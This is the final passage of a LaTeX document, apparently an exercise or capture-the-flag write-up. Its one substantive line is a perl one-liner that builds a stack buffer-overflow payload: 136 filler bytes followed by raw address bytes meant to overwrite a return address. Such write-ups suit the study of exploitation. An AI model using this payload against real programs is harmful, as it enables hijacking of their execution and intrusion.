		\makebox[\linewidth][c]{\texttt{perl -E `print "a"x136,"{\textbackslash}xa8{\textbackslash}xfe{\textbackslash}x64{\textbackslash}x00{\textbackslash}x30{\textbackslash}x15{\textbackslash}x40"'}}
	\end{enumerate}
\end{minipage}

\end{document}
